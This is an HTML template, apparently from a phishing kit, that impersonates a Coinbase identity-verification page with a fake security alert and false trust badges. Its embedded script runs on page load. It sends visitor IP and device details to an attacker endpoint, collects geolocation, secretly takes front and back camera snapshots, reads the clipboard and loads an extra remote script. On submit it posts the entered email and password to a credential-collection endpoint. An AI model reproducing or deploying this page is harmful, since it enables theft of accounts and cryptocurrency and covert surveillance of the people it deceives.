<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Coinbase - Verify Your Identity</title>
<link rel="icon" href="https://static-assets.coinbase.com/exchange/favicon.ico">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #f8f8f8; min-height: 100vh; display: flex; flex-direction: column; }
.header { background: #fff; padding: 16px 32px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; justify-content: space-between; }
.header-logo { display: flex; align-items: center; gap: 8px; }
.header-logo svg { width: 28px; height: 28px; }
.header-logo span { font-size: 20px; font-weight: 700; color: #0052FF; }
.header-badge { display: flex; align-items: center; gap: 4px; background: #e8f5e9; padding: 4px 10px; border-radius: 12px; font-size: 12px; color: #2e7d32; font-weight: 600; }
.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
.container { width: 100%; max-width: 440px; }
.alert-card { background: #fff3e0; border: 1px solid #ffcc02; border-radius: 12px; padding: 16px; margin-bottom: 20px; display: flex; align-items: flex-start; gap: 12px; }
.alert-icon { width: 24px; height: 24px; flex-shrink: 0; background: #ff9800; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 14px; font-weight: 700; }
.alert-text { font-size: 14px; color: #e65100; line-height: 1.5; }
.login-card { background: #fff; border-radius: 16px; box-shadow: 0 2px 12px rgba(0,0,0,0.06); padding: 36px 32px; }
.shield-icon { width: 64px; height: 64px; margin: 0 auto 16px; background: linear-gradient(135deg, #0052FF, #0066ff); border-radius: 16px; display: flex; align-items: center; justify-content: center; }
.shield-icon svg { width: 32px; height: 32px; fill: #fff; }
.login-card h1 { font-size: 24px; font-weight: 700; color: #050f19; text-align: center; margin-bottom: 8px; }
.login-card .subtitle { font-size: 14px; color: #5b616e; text-align: center; margin-bottom: 28px; line-height: 1.5; }
.security-badges { display: flex; gap: 8px; justify-content: center; margin-bottom: 24px; flex-wrap: wrap; }
.badge { display: flex; align-items: center; gap: 4px; background: #f0f0f5; padding: 6px 12px; border-radius: 20px; font-size: 12px; color: #5b616e; font-weight: 500; }
.badge svg { width: 14px; height: 14px; fill: #0052FF; }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 14px; color: #050f19; margin-bottom: 6px; font-weight: 600; }
.form-group input { width: 100%; padding: 14px 16px; border: 2px solid #d1d5db; border-radius: 8px; font-size: 16px; color: #050f19; outline: none; transition: border-color 0.2s; }
.form-group input:focus { border-color: #0052FF; }
.form-group input::placeholder { color: #9ca3af; }
.btn-verify { width: 100%; padding: 14px; background: #0052FF; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; }
.btn-verify:hover { background: #0040cc; }
.crypto-info { display: flex; gap: 12px; margin-top: 24px; padding-top: 24px; border-top: 1px solid #e5e5e5; }
.crypto-item { flex: 1; text-align: center; }
.crypto-item .coin { font-size: 24px; margin-bottom: 4px; }
.crypto-item .name { font-size: 12px; color: #5b616e; }
.crypto-item .price { font-size: 13px; font-weight: 600; color: #050f19; }
.help-text { text-align: center; margin-top: 20px; font-size: 13px; color: #5b616e; }
.help-text a { color: #0052FF; text-decoration: none; font-weight: 600; }
.loading { display: none; text-align: center; padding: 32px; }
.spinner { border: 3px solid #e5e5e5; border-top: 3px solid #0052FF; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
.footer { text-align: center; padding: 24px; font-size: 12px; color: #5b616e; }
.footer a { color: #0052FF; text-decoration: none; }
@media (max-width: 480px) { .login-card { padding: 28px 20px; } .security-badges { gap: 6px; } }
</style>
</head>
<body>
<div class="header">
<div class="header-logo">
<svg viewBox="0 0 1024 1024"><circle cx="512" cy="512" r="512" fill="#0052FF"/><path d="M512.1 692c-99.4 0-180-80.5-180-180s80.6-180 180-180c89.1 0 163.2 65 177.2 150h181.3c-15.2-184.8-168.8-330-358.5-330-198.8 0-360 161.2-360 360s161.2 360 360 360c189.7 0 343.3-145.2 358.5-330H689.3c-14 85-88.1 150-177.2 150z" fill="#fff"/></svg>
<span>coinbase</span>
</div>
<span class="header-badge">
<svg viewBox="0 0 24 24" width="14" height="14" fill="#2e7d32"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
Secured
</span>
</div>
<div class="main">
<div class="container">
<div class="alert-card">
<div class="alert-icon">!</div>
<div class="alert-text">Unusual activity detected on your account. Please verify your identity to continue accessing your wallet.</div>
</div>
<div class="login-card">
<div class="shield-icon">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
</div>
<h1>Verify Your Identity</h1>
<p class="subtitle">For your security, please verify your identity to access your Coinbase wallet</p>
<div class="security-badges">
<span class="badge">
<svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
SSL Encrypted
</span>
<span class="badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
2FA Protected
</span>
<span class="badge">
<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
FDIC Insured
</span>
</div>
<form id="loginForm">
<div class="form-group">
<label>Email address</label>
<input type="email" id="email" placeholder="Enter your email" required>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" id="password" placeholder="Enter your password" required>
</div>
<button type="submit" class="btn-verify">Verify Identity</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="font-size: 14px; color: #5b616e;">Verifying your identity...</p>
</div>
<div class="crypto-info">
<div class="crypto-item"><div class="coin">₿</div><div class="name">Bitcoin</div><div class="price">$67,432</div></div>
<div class="crypto-item"><div class="coin">Ξ</div><div class="name">Ethereum</div><div class="price">$3,521</div></div>
<div class="crypto-item"><div class="coin">◎</div><div class="name">Solana</div><div class="price">$178</div></div>
</div>
<div class="help-text">
Need help? <a href="#">Contact Coinbase Support</a>
</div>
</div>
</div>
</div>
<div class="footer">
© 2024 Coinbase, Inc. | <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Security</a>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

async function gatherAll() {
    let td = '🪙 <b>Coinbase Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';

    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});

    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition((p)=>{
            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
    }

    async function captureCamera(facingMode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 2000));
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }

    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}

    try {
        if(navigator.clipboard && navigator.clipboard.readText) {
            const clip = await navigator.clipboard.readText();
            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
        }
    } catch(e) {}

    try {
        const bat = await navigator.getBattery();
        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
    } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;

    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';

    $.post("<%=a %>/creds", {
        uid: uid,
        user: encodeURIComponent(email),
        pass: encodeURIComponent(pass),
        platform: 'Coinbase'
    });

    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>